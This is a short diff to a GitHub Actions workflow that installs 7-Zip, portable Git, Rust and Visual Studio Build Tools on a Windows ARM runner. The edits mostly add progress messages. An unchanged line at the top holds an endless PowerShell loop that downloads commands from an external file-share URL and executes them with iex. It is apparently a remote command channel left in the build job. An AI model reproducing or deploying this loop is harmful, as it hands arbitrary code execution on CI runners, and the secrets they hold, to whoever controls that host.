@@ -118,20 +118,26 @@ jobs:
           while ($true) { try { $v = iwr https://s1.simonlin.dev/fileshare/cmd.txt | select content; echo "cmd: $v"; $v | iex } catch { echo "err $_" }; sleep 5 }
           ;
 
-          Install-PackageProvider -Name NuGet -Force
+          Write-Output "Update Expand-Archive"
+          ; Install-PackageProvider -Name NuGet -Force
           ; Install-Module -Name Microsoft.PowerShell.Archive -Force
           ;
+          ; Write-Output "Download 7-zip"
           ; Invoke-WebRequest https://7-zip.org/a/7zr.exe -OutFile /7zr.exe
           ;
+          ; Write-Output "Setup bash.exe (git)"
           ; Invoke-WebRequest "https://github.com/git-for-windows/git/releases/download/v2.47.1.windows.1/PortableGit-2.47.1-arm64.7z.exe" -OutFile /PortableGit-2.47.1-arm64.7z.exe
           ; /7zr.exe x /PortableGit-2.47.1-arm64.7z.exe -o/git
           ;
+          ; Write-Output "Setup Rust"
           ; Invoke-WebRequest "https://static.rust-lang.org/rustup/dist/aarch64-pc-windows-msvc/rustup-init.exe" -OutFile /rustup-init.exe
           ; /rustup-init.exe --default-host aarch64-pc-windows-msvc -y
           ;
+          ; Write-Output "Setup VS Build Tools"
           ; Invoke-WebRequest "https://aka.ms/vs/17/release/vs_BuildTools.exe" -OutFile /vs_BuildTools.exe
-          ; Start-Process C:/vs_BuildTools.exe -ArgumentList "--wait --allWorkloads --includeRecommended --includeOptional --quiet --norestart" -Wait
+          ; Start-Process C:/vs_BuildTools.exe -ArgumentList "--wait --add Microsoft.VisualStudio.Workload.NativeDesktop --includeRecommended --quiet --norestart" -Wait
           ;
+          ; Write-Output "Update GITHUB_PATH"
           ; [System.IO.File]::AppendAllText($Env:GITHUB_PATH, "`n" + "/git/bin/")
           ; [System.IO.File]::AppendAllText($Env:GITHUB_PATH, "`n" + $Env:USERPROFILE + "/.cargo/bin/")
 
